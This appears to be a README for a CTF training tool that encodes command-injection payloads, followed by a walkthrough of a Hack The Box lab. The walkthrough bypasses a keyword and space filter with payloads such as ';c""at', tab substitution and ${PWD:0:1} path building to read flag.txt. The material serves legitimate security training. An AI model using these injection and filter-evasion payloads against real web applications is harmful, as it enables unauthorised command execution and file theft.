# Request Encoder

Request Encoder is a module that can be used to encode requests mostly for pseudo-manual command injection exploitation. This tool was developed for training purposes.

## Examples

The tool accept three kind of input formats injected into `-p`:

* `-i`: a string that is injected into
* `-w`: a wordlist (one string per line)
* `-I`: a file whose content will be inline using `\n`

```bash
$ onectf request -u 'URL' -v -X POST -p uid -w uids
```

By default, assuming the parameter is `-p param`, then the parameter will be injected into the URL (`GET`) or in the body (`POST/...`). Some websites are not using parameters, e.g., they send `body: xxx` instead of `body: param=xxx`.

* Use `--json` when there is no parameter and the payload is JSON
* Use `--raw` when there is no parameter

```bash
$ onectf request -u 'URL' -v -X PUT --json -I request.json
$ onectf request -u 'URL' -v -X POST --raw -I request.xml
```

Aliases are automatically enabled by default. You can use:

* `<q>` instead of `'` (quote)
* `<er>` instead of `2>&1` (error redirection)
* `<tab>` for a tabulation character
* `<m>` instead of `-` (minus)
* `<crlf>` instead of `%0D%0A` (`\r\n`)
* `<lf>` instead of `%0A` (`\n`)

```bash
$ onectf request -u 'URL' -v -X POST -p param -i '|| cat file <er>'
$ onectf request -u 'URL' -v -X POST -p param -i 'echo <q>Hello<q>'
$ onectf request -u 'URL' -v -X POST -p param -i 'xxx<lf>whoami'
```

You can select with tamper script to apply:

```bash
$ onectf request -u 'URL' -v -X POST -p param --tamper php_octal -i 'phpinfo()'
$ onectf request -u 'URL' -v -X POST -p 'param' -I file --raw --tamper data_base64
$ onectf request -u 'URL' -v -X GET -p 'param' -w uids -f html --tamper base64
```

While fuzzing is not the primary purpose:

```bash
$ onectf request -u 'URL/FUZZ' -v -X GET --fuzz -w uids -f json
$ onectf request -u 'URL/FUZZ' -X GET --fuzz -H 'Cookie: session=XXX; HttpOnly; Path=/' -w uids -f json
```

You can use `-f` to select a specific output format:

```bash
$ onectf request -u 'URL' -v -X POST -d 'param1=a&param2=b' -p 'param3' -i '5+5' -f raw
$ onectf request -u 'URL' -v -X POST -p 'uid' -w uids -f html
$ onectf request -u 'URL/FUZZ' -v -X GET --fuzz -w uids -f json
```

## Testing

We can test the tool on the following practice CTF machine: `https://academy.hackthebox.com/module/109/section/1042`.

* We can try to inject something in each parameter of the request, such as `from` below:

```bash
$ onectf request -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';' -v
```

The following requests result in an error displayed to the URL indicating that the command `mv` failed (missing operand). **The parameter is vulnerable.**

Trying payloads with well-known commands such as `;id`, `;pwd` or `;cat` are filtered (`Malicious request denied!`) while `;w` works fine. Commands such as `;c""at` are by-passing the filter.

```bash
$ onectf request -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';c""at' -v
```

Spaces are filtered. We can use tabs using the placeholder `<tab>`.

```bash
$ onectf request -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';c""at<tab>' -v
```

We need to build a path. `..` is allowed, while `../` is filtered. We can use variables:

```bash
$ onectf request -u "<URL:port>/index.php?to=tmp&from=51459716.txt&finish=1&move=1" -H 'Cookie: filemanager=<auth cookie>' -p from -i ';ca""t<tab>..${PWD:0:1}..${PWD:0:1}..${PWD:0:1}..${PWD:0:1}flag.txt' -v
```